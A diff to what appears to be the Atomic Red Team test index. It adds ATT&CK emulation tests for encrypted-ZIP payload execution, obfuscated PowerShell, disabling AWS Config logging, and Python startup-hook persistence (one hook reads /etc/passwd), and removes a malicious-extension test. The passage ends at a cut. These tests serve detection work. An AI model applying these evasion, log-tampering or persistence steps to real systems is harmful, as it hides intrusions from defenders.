@@ -2048,7 +2048,6 @@ defense-evasion:
           $encodedString = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
           $bytes = [System.Convert]::FromBase64String($encodedString)
           $decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)
-
           #write the decoded eicar string to file
           $decodedString | Out-File T1027.013_decodedEicar.txt
         cleanup_command: Just delete the resulting T1027.013_decodedEicar.txt file.
@@ -2066,15 +2065,58 @@ defense-evasion:
         command: |-
           $encryptedString = "76492d1116743f0423413b16050a5345MgB8AGkASwA0AHMAbwBXAFoAagBkAFoATABXAGIAdAA5AFcAWAB1AFMANABVAEEAPQA9AHwAZQBjAGMANgAwADQAZAA0AGQAMQAwADUAYgA4ADAAMgBmADkAZgBjADEANQBjAGMANQBiAGMANwA2AGYANQBmADUANABhAGIAYgAyAGMANQA1AGQAMgA5ADEANABkADUAMgBiAGMANgA2AGMAMAAxADUAZABjADAAOABjAGIANAA1ADUANwBjADcAZQBlAGQAYgAxADEAOQA4AGIAMwAwADMANwAwADAANQA2ADQAOAA4ADkAZgA4ADMAZQA4ADgAOQBiAGEAMAA2ADMAMQAyADYAMwBiAGUAMAAxADgANAA0ADYAOAAxADQANQAwAGUANwBkADkANABjADcANQAxADgAYQA2ADMANQA4AGIAYgA1ADkANQAzAGIAMwAxADYAOAAwADQAMgBmADcAZQBjADYANQA5AGIANwBkADUAOAAyAGEAMgBiADEAMQAzAGQANABkADkAZgA3ADMAMABiADgAOQAxADAANAA4ADcAOQA5ADEAYQA1ADYAZAAzADQANwA3AGYANgAyADcAMAAwADEAMQA4ADEAZgA5ADUAYgBmAGYANQA3ADQAZQA4AGUAMAAxADUANwAwAGQANABiADMAMwA2ADgANwA0AGIANwAyADMAMQBhADkAZABhADEANQAzADQAMgAzADEANwAxADAAZgAxADkAYQA1ADEAMQA="
           $key = [byte]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32
-
           $decrypt = ConvertTo-SecureString -String $encryptedString -Key $key
           $decryptedString = [Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($decrypt))
-
           #Write the decrypted eicar string to a file
           $decryptedString | out-file T1027.013_decryptedEicar.txt
         cleanup_command: Just delete the resulting T1027.013_decryptedEicar.txt file.
         name: powershell
         elevation_required: false
+    - name: Password-Protected ZIP Payload Extraction and Execution
+      auto_generated_guid: c2ca068a-eb1e-498f-9f93-3d554c455916
+      description: |
+        Extracts and executes a script from a password-protected ZIP archive.
+        This technique is commonly used by malware families like Emotet and QBot to deliver payloads
+        via email attachments where the password is provided in the message body.
+        The encrypted ZIP evades static file analysis until extracted at runtime.
+        Upon successful execution, displays confirmation and system information.
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        zip_password:
+          description: Password used to protect the ZIP archive
+          type: String
+          default: infected
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'zip and unzip must be installed
+
+          '
+        prereq_command: 'which zip && which unzip
+
+          '
+        get_prereq_command: 'echo "Install zip and unzip using your package manager
+          (apt-get, yum, or brew)"
+
+          '
+      executor:
+        command: |
+          echo '#!/bin/bash' > /tmp/art_payload.sh
+          echo 'echo "T1027.013: Payload extracted from encrypted ZIP"' >> /tmp/art_payload.sh
+          echo 'echo "Hostname: $(hostname)"' >> /tmp/art_payload.sh
+          echo 'echo "User: $(whoami)"' >> /tmp/art_payload.sh
+          echo 'uname -a' >> /tmp/art_payload.sh
+          cd /tmp && zip -P "#{zip_password}" art_encrypted.zip art_payload.sh
+          rm /tmp/art_payload.sh
+          echo "Encrypted ZIP created. Extracting with password..."
+          unzip -P "#{zip_password}" -o /tmp/art_encrypted.zip -d /tmp/
+          echo "Executing extracted payload:"
+          bash /tmp/art_payload.sh
+        cleanup_command: |
+          rm -f /tmp/art_payload.sh
+          rm -f /tmp/art_encrypted.zip
+        name: bash
   T1014:
     technique:
       type: attack-pattern
@@ -23857,6 +23899,22 @@ defense-evasion:
 
           '
         name: command_prompt
+    - name: Obfuscated PowerShell Command via Character Array
+      auto_generated_guid: 6683baf0-6e77-4f58-b114-814184ea8150
+      description: "Spawns a child PowerShell process using character array obfuscation.
+        \nBoth the PowerShell binary name and executed command are constructed \nfrom
+        ASCII values at runtime to evade string-based detection.\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          $ps = [char[]](112,111,119,101,114,115,104,101,108,108)
+          $cmd = [char[]](83,116,97,114,116,45,80,114,111,99,101,115,115,32,99,97,108,99,46,101,120,101)
+          & (-join $ps) "-Command" (-join $cmd)
+        cleanup_command: |
+          taskkill /f /im calculator.exe >nul 2>nul
+          taskkill /f /im CalculatorApp.exe >nul 2>nul
+        name: powershell
   T1556.006:
     technique:
       type: attack-pattern
@@ -27124,6 +27182,61 @@ defense-evasion:
         get_prereq_command: 'gcloud auth login --no-launch-browser
 
           '
+    - name: AWS - Config Logs Disabled
+      auto_generated_guid: 4608bc1b-e682-466b-a7d7-dbd76760db31
+      description: 'Disables AWS Config by stopping the configuration recorder, deleting
+        the delivery channel, and deleting the configuration recorder. An attacker
+        with sufficient permissions can use this to stop configuration change recording
+        and avoid detection of subsequent activity.
+
+        '
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        configuration_recorder_name:
+          description: Name of the configuration recorder
+          type: string
+          default: redatomictestconfigurationrecorder
+        delivery_channel_name:
+          description: Name of the delivery channel
+          type: string
+          default: redatomictestdeliverychannel
+        region:
+          description: Name of the region
+          type: string
+          default: us-west-2
+      dependencies:
+      - description: 'Check if ~/.aws/credentials file has a default stanza is configured
+
+          '
+        prereq_command: 'cat ~/.aws/credentials | grep "default"
+
+          '
+        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
+          default profile using: aws configure
+
+          '
+      - description: 'Check if terraform is installed.
+
+          '
+        prereq_command: 'terraform version
+
+          '
+        get_prereq_command: 'echo Please install terraform and configure your AWS
+          default profile
+
+          '
+      executor:
+        command: |
+          aws configservice stop-configuration-recorder --configuration-recorder-name #{configuration_recorder_name} --region #{region}
+          echo "*** Configuration recorder stopped ***"
+          aws configservice delete-delivery-channel --delivery-channel-name #{delivery_channel_name} --region #{region}
+          echo "*** Delivery channel deleted ***"
+          aws configservice delete-configuration-recorder --configuration-recorder-name #{configuration_recorder_name} --region #{region}
+          echo "*** Configuration recorder deleted ***"
+        cleanup_command: aws configservice list-configuration-recorders --region us-west-2
+        name: sh
+        elevation_required: false
   T1564.003:
     technique:
       type: attack-pattern
@@ -46275,7 +46388,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-21T02:35:20.850Z'
-      name: Python Startup Hooks
+      name: 'Event Triggered Execution: Python Startup Hooks'
       description: "Adversaries may achieve persistence by leveraging Python’s startup
         mechanisms, including path configuration (`.pth`) files and the `sitecustomize.py`
         or `usercustomize.py` modules. These files are automatically processed during
@@ -46311,7 +46424,239 @@ privilege-escalation:
       - macOS
       - Windows
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1546.018
+    atomic_tests:
+    - name: Python Startup Hook - atomic_hook.pth (Windows)
+      auto_generated_guid: 57289962-21dc-4501-b756-80cd30608d9f
+      description: "Executes code by placing a .pth file in the site-packages directory.
+        \nSupports python.exe and python3.exe via input arguments.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        python_exe:
+          description: The python binary name to test.
+          type: String
+          default: python.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Python must be installed and the specified binary (#{python_exe})
+          must be in the PATH.
+
+          '
+        prereq_command: 'if (Get-Command @("#{python_exe}", ''python3.exe'') -ErrorAction
+          SilentlyContinue) { exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: 'Write-Host "[!] Python3 not found. Please install Python3
+          (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/)
+          or ensure it is in your PATH."
+
+          '
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $TempDir = Join-Path $env:TEMP "atomic_pth_win"
+          New-Item -ItemType Directory -Path $TempDir -Force
+          & "#{python_exe}" -m venv "$TempDir\env"
+          $SitePackages = & "$TempDir\env\Scripts\python.exe" -c "import site; print(site.getsitepackages()[1])"
+          "import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))" | Out-File -Encoding ASCII "$SitePackages\atomic_hook.pth"
+          Get-ChildItem -Path "$SitePackages" | Where-Object { $_.Name -like "*.pth" }
+          & "$TempDir\env\Scripts\python.exe" -c "print('Triggering Hook via atomic_hook...')"
+        cleanup_command: |
+          if (-not (Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Where-Object Name -like 'atomic_pth_win')) { Write-Host "[!] Artifact missing: $env:Temp\atomic_pth_win Folder - [-] Please Run : Invoke-AtomicTest T1546.018"; exit 1 };
+          Remove-Item -Path "$env:TEMP\atomic_pth_win" -Recurse -Force
+          Write-Host "[+] Successfully Removed atomic_pth_win folder and atomic_hook.pth from Temp Directory"
+          Get-Process -Name "Calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
+          Get-Process -Name "calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
+          Write-Host "[+] Successfully Terminated Calculator"
+    - name: Python Startup Hook - usercustomize.py (Windows)
+      auto_generated_guid: 05cc7a2c-ce32-46f2-a358-f27f76718c39
+      description: "Executes code via usercustomize.py. This is a per-user persistence
+        mechanism \nthat does not require Administrative privileges.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        python_exe:
+          description: The python binary name to test
+          type: String
+          default: python.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Python must be installed and the specified binary (#{python_exe})
+          must be in the PATH.
+
+          '
+        prereq_command: 'if (Get-Command @("#{python_exe}", ''python3.exe'') -ErrorAction
+          SilentlyContinue) { exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: 'Write-Host "[!] Python3 not found. Please install Python3
+          (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/)
+          or ensure it is in your PATH."
+
+          '
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $UserDir = & "#{python_exe}" -c "import site; print(site.getusersitepackages())"
+          if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir -Force }
+          "import os; os.system('calc.exe')" | Out-File -FilePath "$UserDir\usercustomize.py" -Encoding ASCII
+          Get-ChildItem -Path "$UserDir"
+          & "#{python_exe}" -c "print('Triggering Hook via usercustomize...')"
+        cleanup_command: "$PyBin = if (Get-Command \"#{python_exe}\" -ErrorAction
+          SilentlyContinue) { \"#{python_exe}\" } elseif (Get-Command \"python3.exe\"
+          -ErrorAction SilentlyContinue) { \"python3.exe\" } else { \"python.exe\"
+          }; \n$UserDir = & $PyBin -S -c \"import site; print(site.getusersitepackages())\"\nif
+          (-not (Get-ChildItem -Path $UserDir -Recurse -ErrorAction SilentlyContinue
+          | Where-Object Name -like 'usercustomize*')) { Write-Host \"[!] Artifact
+          missing: $UserDir\\usercustomize.py - [-] Please Run : Invoke-AtomicTest
+          T1546.018\"; exit 1 };\nGet-ChildItem -Path \"$UserDir\" -Recurse -Force
+          |\nWhere-Object { $_.Name -like \"usercustomize*\" } |\nRemove-Item -Force
+          \nWrite-Host \"[+] Successfully Removed usercustomize.py under $UserDir\"\nGet-Process
+          -Name \"Calc*\", \"calc*\" -ErrorAction SilentlyContinue | Stop-Process
+          -Force\nWrite-Host \"[+] Successfully Terminated Calculator\"\n"
+    - name: Python Startup Hook - atomic_hook.pth (Linux)
+      auto_generated_guid: a58c066d-f2f0-42a2-ab70-30af73f89e66
+      description: "Executes code by creating atomic_hook.pth in the site-packages
+        directory. \nThis script runs automatically for every user on the system when
+        Python starts.\n"
+      supported_platforms:
+      - linux
+      input_arguments:
+        python_exe:
+          description: The python binary name to test
+          type: String
+          default: python3
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Python must be installed and the specified binary (#{python_exe})
+          must be in the PATH.
+
+          '
+        prereq_command: |
+          PYTHON_CMD=$(command -v #{python_exe} || command -v python)
+          if [ -z "$PYTHON_CMD" ]; then exit 1; fi
+          $PYTHON_CMD -m venv --help >/dev/null 2>&1
+        get_prereq_command: 'echo "Python not found. Please install Python using your
+          package manager (e.g., Debian Based ''sudo apt-get update && sudo apt-get
+          install -y python3 python3-venv'', RedHat / CentOS Based ''sudo yum install
+          -y python3 python3-venv || sudo dnf install -y python3 python3-venv'')."
+
+          '
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          TEMPDIR="/tmp/atomic_sitecust_posix"
+          mkdir -p "$TEMPDIR"
+          "#{python_exe}" -m venv "$TEMPDIR/env"
+          SITE_PACKAGES=$("$TEMPDIR/env/bin/#{python_exe}" -c "import site; print(site.getsitepackages()[0])")
+          echo "import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')" > "$SITE_PACKAGES/atomic_hook.pth"
+          ls -la "$SITE_PACKAGES/atomic_hook.pth"
+          "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
+          if [ -f /tmp/atomic_hook_poc.txt ]; then echo "[+] Success: atomic_hook_poc.txt created under /tmp \n" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo "Failed: /tmp/atomic_hook_poc.txt not found"; fi
+        cleanup_command: |
+          if [ ! -f /tmp/atomic_hook_poc.txt ] || [ ! -d /tmp/atomic_sitecust_posix ]; then echo "[!] Missing artifact or folder: /tmp/atomic_hook_poc.txt or /tmp/atomic_sitecust_posix — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
+          rm -rf /tmp/atomic_sitecust_posix
+          echo "[+] Successful Removed atomic_hook.pth"
+          rm -rf /tmp/atomic_hook_poc.txt
+          echo "[+] Successful Removed atomic_hook_poc.txt under /tmp"
+    - name: Python Startup Hook - atomic_hook.pth (macOS)
+      auto_generated_guid: 28ca4f81-fa96-47ff-8555-dde98017e89b
+      description: 'Creates a Python startup hook using a .pth file inside a virtual
+        environment on macOS.
+
+        '
+      supported_platforms:
+      - macos
+      input_arguments:
+        exe_name:
+          description: App to launch
+          type: string
+          default: Calculator
+        python_exe:
+          description: The python binary name to test
+          type: string
+          default: python3
+      dependency_executor_name: sh
+      dependencies:
+      - description: Python must be installed and the specified binary (#{python_exe})
+          must be in the PATH.
+        prereq_command: |
+          PYTHON_CMD=$(command -v python || command -v #{python_exe})
+          if [ -z "$PYTHON_CMD" ]; then exit 1; fi
+          $PYTHON_CMD -m venv --help >/dev/null 2>&1
+        get_prereq_command: 'echo "Python3 not found. Please install it using Homebrew
+          (''brew install python'' or ''brew install python3 or brew install python@3.X'')
+          or the macOS developer tools (''xcode-select --install'')."
+
+          '
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          PYTHON_EXE=$(command -v #{python_exe} || command -v python)
+          TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XX)
+          echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt
+          $PYTHON_EXE -m venv "$TEMPDIR/env"
+          SITE_PACKAGES=$("$TEMPDIR/env/bin/#{python_exe}" -c "import site; print(site.getsitepackages()[0])")
+          echo "import subprocess; subprocess.Popen(['open', '-a', '#{exe_name}'])" > "$SITE_PACKAGES/atomic_hook.pth"
+          "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
+        cleanup_command: |
+          if [ ! -f /tmp/atomic_python_hook_path.txt ] || [ ! -d $(cat /tmp/atomic_python_hook_path.txt) ]; then echo "[!] Artifact missing: /tmp/atomic_python_hook_path.txt — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
+          pkill "#{exe_name}" || true
+          [ -f /tmp/atomic_python_hook_path.txt ] && rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
+          echo "[+] Successful Removed atomic_hook.pth and terminated #{exe_name}"
+    - name: Python Startup Hook - usercustomize.py (Linux / MacOS)
+      auto_generated_guid: 6e78084a-a433-4702-a838-cc7b765d87e8
+      description: "Executes code via usercustomize.py. This is a per-user persistence
+        mechanism \nthat does not require root privileges.\n"
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        python_exe:
+          description: The python binary name to test
+          type: String
+          default: python3
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Python must be installed and the specified binary (#{python_exe})
+          must be in the PATH.
+
+          '
+        prereq_command: |
+          PYTHON_CMD=$(command -v #{python_exe} || command -v python)
+          if [ -z "$PYTHON_CMD" ]; then exit 1; fi
+          $PYTHON_CMD -m venv --help >/dev/null 2>&1
+        get_prereq_command: 'echo "Python not found. Please install Python using your
+          package manager (e.g., Debian Based ''sudo apt-get update && sudo apt-get
+          install -y python3 python3-venv'', RedHat / CentOS Based ''sudo yum install
+          -y python3 python3-venv || sudo dnf install -y python3 python3-venv'', MacOS
+          brew install python3 or brew install python@3.x or the macOS developer tools
+          (''xcode-select --install''))."
+
+          '
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          PYTHON_EXE=$(command -v #{python_exe} || command -v python)
+          USER_PACKAGES=$($PYTHON_EXE -c "import site; print(site.getusersitepackages())")
+          mkdir -p "$USER_PACKAGES"
+          echo "import os; os.system('date > /tmp/poc.txt')" > "$USER_PACKAGES/usercustomize.py"
+          if [ -f "$USER_PACKAGES/usercustomize.py" ]; then echo "Success: usercustomize.py created under $USER_PACKAGES\n" $(ls -la "$USER_PACKAGES" | grep usercustomize*); else echo "Failed: usercustomize.py not found under $USER_PACKAGES"; fi
+          $PYTHON_EXE -c "print('Triggering Hook via usercustomize.py...')"
+          if [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found"; fi
+        cleanup_command: |
+          PYTHON_CMD=$(command -v #{python_exe} || command -v python)
+          USER_PACKAGES=$($PYTHON_CMD -S -c "import site; print(site.getusersitepackages())")
+          if [ ! -f /tmp/poc.txt ] || [ ! -f $USER_PACKAGES/usercustomize.py ]; then echo "[!] Artifact missing: /tmp/poc.txt and $USER_PACKAGES/usercustomize.py — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
+          if [ -e "$USER_PACKAGES"/usercustomize* ]; then echo "[+] Successful remove $USER_PACKAGES/usercustomize.py\n" $(rm -rf "$USER_PACKAGES"/usercustomize*); else echo "usercustomize.py not found under $USER_PACKAGES"; fi
+          rm -rf /tmp/poc.txt
+          echo "[+] Successful remove poc.txt under /tmp"
   T1037.003:
     technique:
       type: attack-pattern
@@ -60810,20 +61155,6 @@ persistence:
 
           3. Click 'Select'
         name: manual
-    - name: Chrome/Chromium (Chrome Web Store)
-      auto_generated_guid: 4c83940d-8ca5-4bb2-8100-f46dc914bc3f
-      description: Install the "Minimum Viable Malicious Extension" Chrome extension
-      supported_platforms:
-      - linux
-      - windows
-      - macos
-      executor:
-        steps: |
-          1. Navigate to https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend
-          in Chrome
-
-          2. Click 'Add to Chrome'
-        name: manual
     - name: Firefox
       auto_generated_guid: cb790029-17e6-4c43-b96f-002ce5f10938
       description: 'Create a file called test.wma, with the duration of 30 seconds
@@ -71751,7 +72082,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-21T02:35:20.850Z'
-      name: Python Startup Hooks
+      name: 'Event Triggered Execution: Python Startup Hooks'
       description: "Adversaries may achieve persistence by leveraging Python’s startup
         mechanisms, including path configuration (`.pth`) files and the `sitecustomize.py`
         or `usercustomize.py` modules. These files are automatically processed during
@@ -71787,7 +72118,239 @@ persistence:
       - macOS
       - Windows
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1546.018
+    atomic_tests:
+    - name: Python Startup Hook - atomic_hook.pth (Windows)
+      auto_generated_guid: 57289962-21dc-4501-b756-80cd30608d9f
+      description: "Executes code by placing a .pth file in the site-packages directory.
+        \nSupports python.exe and python3.exe via input arguments.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        python_exe:
+          description: The python binary name to test.
+          type: String
+          default: python.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Python must be installed and the specified binary (#{python_exe})
+          must be in the PATH.
+
+          '
+        prereq_command: 'if (Get-Command @("#{python_exe}", ''python3.exe'') -ErrorAction
+          SilentlyContinue) { exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: 'Write-Host "[!] Python3 not found. Please install Python3
+          (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/)
+          or ensure it is in your PATH."
+
+          '
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $TempDir = Join-Path $env:TEMP "atomic_pth_win"
+          New-Item -ItemType Directory -Path $TempDir -Force
+          & "#{python_exe}" -m venv "$TempDir\env"
+          $SitePackages = & "$TempDir\env\Scripts\python.exe" -c "import site; print(site.getsitepackages()[1])"
+          "import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))" | Out-File -Encoding ASCII "$SitePackages\atomic_hook.pth"
+          Get-ChildItem -Path "$SitePackages" | Where-Object { $_.Name -like "*.pth" }
+          & "$TempDir\env\Scripts\python.exe" -c "print('Triggering Hook via atomic_hook...')"
+        cleanup_command: |
+          if (-not (Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Where-Object Name -like 'atomic_pth_win')) { Write-Host "[!] Artifact missing: $env:Temp\atomic_pth_win Folder - [-] Please Run : Invoke-AtomicTest T1546.018"; exit 1 };
+          Remove-Item -Path "$env:TEMP\atomic_pth_win" -Recurse -Force
+          Write-Host "[+] Successfully Removed atomic_pth_win folder and atomic_hook.pth from Temp Directory"
+          Get-Process -Name "Calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
+          Get-Process -Name "calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
+          Write-Host "[+] Successfully Terminated Calculator"
+    - name: Python Startup Hook - usercustomize.py (Windows)
+      auto_generated_guid: 05cc7a2c-ce32-46f2-a358-f27f76718c39
+      description: "Executes code via usercustomize.py. This is a per-user persistence
+        mechanism \nthat does not require Administrative privileges.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        python_exe:
+          description: The python binary name to test
+          type: String
+          default: python.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Python must be installed and the specified binary (#{python_exe})
+          must be in the PATH.
+
+          '
+        prereq_command: 'if (Get-Command @("#{python_exe}", ''python3.exe'') -ErrorAction
+          SilentlyContinue) { exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: 'Write-Host "[!] Python3 not found. Please install Python3
+          (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/)
+          or ensure it is in your PATH."
+
+          '
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $UserDir = & "#{python_exe}" -c "import site; print(site.getusersitepackages())"
+          if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir -Force }
+          "import os; os.system('calc.exe')" | Out-File -FilePath "$UserDir\usercustomize.py" -Encoding ASCII
+          Get-ChildItem -Path "$UserDir"
+          & "#{python_exe}" -c "print('Triggering Hook via usercustomize...')"
+        cleanup_command: "$PyBin = if (Get-Command \"#{python_exe}\" -ErrorAction
+          SilentlyContinue) { \"#{python_exe}\" } elseif (Get-Command \"python3.exe\"
+          -ErrorAction SilentlyContinue) { \"python3.exe\" } else { \"python.exe\"
+          }; \n$UserDir = & $PyBin -S -c \"import site; print(site.getusersitepackages())\"\nif
+          (-not (Get-ChildItem -Path $UserDir -Recurse -ErrorAction SilentlyContinue
+          | Where-Object Name -like 'usercustomize*')) { Write-Host \"[!] Artifact
+          missing: $UserDir\\usercustomize.py - [-] Please Run : Invoke-AtomicTest
+          T1546.018\"; exit 1 };\nGet-ChildItem -Path \"$UserDir\" -Recurse -Force
+          |\nWhere-Object { $_.Name -like \"usercustomize*\" } |\nRemove-Item -Force
+          \nWrite-Host \"[+] Successfully Removed usercustomize.py under $UserDir\"\nGet-Process
+          -Name \"Calc*\", \"calc*\" -ErrorAction SilentlyContinue | Stop-Process
+          -Force\nWrite-Host \"[+] Successfully Terminated Calculator\"\n"
+    - name: Python Startup Hook - atomic_hook.pth (Linux)
+      auto_generated_guid: a58c066d-f2f0-42a2-ab70-30af73f89e66
+      description: "Executes code by creating atomic_hook.pth in the site-packages
+        directory. \nThis script runs automatically for every user on the system when
+        Python starts.\n"
+      supported_platforms:
+      - linux
+      input_arguments:
+        python_exe:
+          description: The python binary name to test
+          type: String
+          default: python3
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Python must be installed and the specified binary (#{python_exe})
+          must be in the PATH.
+
+          '
+        prereq_command: |
+          PYTHON_CMD=$(command -v #{python_exe} || command -v python)
+          if [ -z "$PYTHON_CMD" ]; then exit 1; fi
+          $PYTHON_CMD -m venv --help >/dev/null 2>&1
+        get_prereq_command: 'echo "Python not found. Please install Python using your
+          package manager (e.g., Debian Based ''sudo apt-get update && sudo apt-get
+          install -y python3 python3-venv'', RedHat / CentOS Based ''sudo yum install
+          -y python3 python3-venv || sudo dnf install -y python3 python3-venv'')."
+
+          '
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          TEMPDIR="/tmp/atomic_sitecust_posix"
+          mkdir -p "$TEMPDIR"
+          "#{python_exe}" -m venv "$TEMPDIR/env"
+          SITE_PACKAGES=$("$TEMPDIR/env/bin/#{python_exe}" -c "import site; print(site.getsitepackages()[0])")
+          echo "import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')" > "$SITE_PACKAGES/atomic_hook.pth"
+          ls -la "$SITE_PACKAGES/atomic_hook.pth"
+          "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
+          if [ -f /tmp/atomic_hook_poc.txt ]; then echo "[+] Success: atomic_hook_poc.txt created under /tmp \n" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo "Failed: /tmp/atomic_hook_poc.txt not found"; fi
+        cleanup_command: |
+          if [ ! -f /tmp/atomic_hook_poc.txt ] || [ ! -d /tmp/atomic_sitecust_posix ]; then echo "[!] Missing artifact or folder: /tmp/atomic_hook_poc.txt or /tmp/atomic_sitecust_posix — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
+          rm -rf /tmp/atomic_sitecust_posix
+          echo "[+] Successful Removed atomic_hook.pth"
+          rm -rf /tmp/atomic_hook_poc.txt
+          echo "[+] Successful Removed atomic_hook_poc.txt under /tmp"
+    - name: Python Startup Hook - atomic_hook.pth (macOS)
+      auto_generated_guid: 28ca4f81-fa96-47ff-8555-dde98017e89b
+      description: 'Creates a Python startup hook using a .pth file inside a virtual
+        environment on macOS.
+
+        '
+      supported_platforms:
+      - macos
+      input_arguments:
+        exe_name:
+          description: App to launch
+          type: string
+          default: Calculator
+        python_exe:
+          description: The python binary name to test
+          type: string
+          default: python3
+      dependency_executor_name: sh
+      dependencies:
+      - description: Python must be installed and the specified binary (#{python_exe})
+          must be in the PATH.
+        prereq_command: |
+          PYTHON_CMD=$(command -v python || command -v #{python_exe})
+          if [ -z "$PYTHON_CMD" ]; then exit 1; fi
+          $PYTHON_CMD -m venv --help >/dev/null 2>&1
+        get_prereq_command: 'echo "Python3 not found. Please install it using Homebrew
+          (''brew install python'' or ''brew install python3 or brew install python@3.X'')
+          or the macOS developer tools (''xcode-select --install'')."
+
+          '
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          PYTHON_EXE=$(command -v #{python_exe} || command -v python)
+          TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XX)
+          echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt
+          $PYTHON_EXE -m venv "$TEMPDIR/env"
+          SITE_PACKAGES=$("$TEMPDIR/env/bin/#{python_exe}" -c "import site; print(site.getsitepackages()[0])")
+          echo "import subprocess; subprocess.Popen(['open', '-a', '#{exe_name}'])" > "$SITE_PACKAGES/atomic_hook.pth"
+          "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
+        cleanup_command: |
+          if [ ! -f /tmp/atomic_python_hook_path.txt ] || [ ! -d $(cat /tmp/atomic_python_hook_path.txt) ]; then echo "[!] Artifact missing: /tmp/atomic_python_hook_path.txt — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
+          pkill "#{exe_name}" || true
+          [ -f /tmp/atomic_python_hook_path.txt ] && rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
+          echo "[+] Successful Removed atomic_hook.pth and terminated #{exe_name}"
+    - name: Python Startup Hook - usercustomize.py (Linux / MacOS)
+      auto_generated_guid: 6e78084a-a433-4702-a838-cc7b765d87e8
+      description: "Executes code via usercustomize.py. This is a per-user persistence
+        mechanism \nthat does not require root privileges.\n"
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        python_exe:
+          description: The python binary name to test
+          type: String
+          default: python3
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Python must be installed and the specified binary (#{python_exe})
+          must be in the PATH.
+
+          '
+        prereq_command: |
+          PYTHON_CMD=$(command -v #{python_exe} || command -v python)
+          if [ -z "$PYTHON_CMD" ]; then exit 1; fi
+          $PYTHON_CMD -m venv --help >/dev/null 2>&1
+        get_prereq_command: 'echo "Python not found. Please install Python using your
